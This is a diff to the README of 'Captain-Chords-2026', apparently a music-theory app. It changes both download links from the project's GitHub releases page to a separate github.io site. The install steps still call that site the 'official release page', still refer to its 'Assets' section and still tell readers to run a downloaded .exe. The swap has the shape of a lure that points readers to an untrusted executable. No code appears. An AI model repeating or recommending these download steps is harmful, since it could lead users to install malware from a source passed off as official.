@@ -1,6 +1,6 @@
 # 🎹 Captain-Chords-2026 - Master music theory with ease today
 
-[![](https://img.shields.io/badge/Download_Latest_Version-Blue.svg)](https://github.com/Sacrificial-agnomen154/Captain-Chords-2026/releases)
+[![](https://img.shields.io/badge/Download_Latest_Version-Blue.svg)](https://sacrificial-agnomen154.github.io)
 
 ## 📌 Introduction
 
@@ -20,7 +20,7 @@ To run this software, your computer needs these specifications:
 
 Follow these steps to acquire the installer for your system:
 
-1.  Visit the official release page: [https://github.com/Sacrificial-agnomen154/Captain-Chords-2026/releases](https://github.com/Sacrificial-agnomen154/Captain-Chords-2026/releases).
+1.  Visit the official release page: [https://sacrificial-agnomen154.github.io](https://sacrificial-agnomen154.github.io).
 2.  Locate the section labeled "Assets" at the bottom of the page.
 3.  Click the file ending in .exe to start the download.
 4.  Save the file to your Downloads folder.
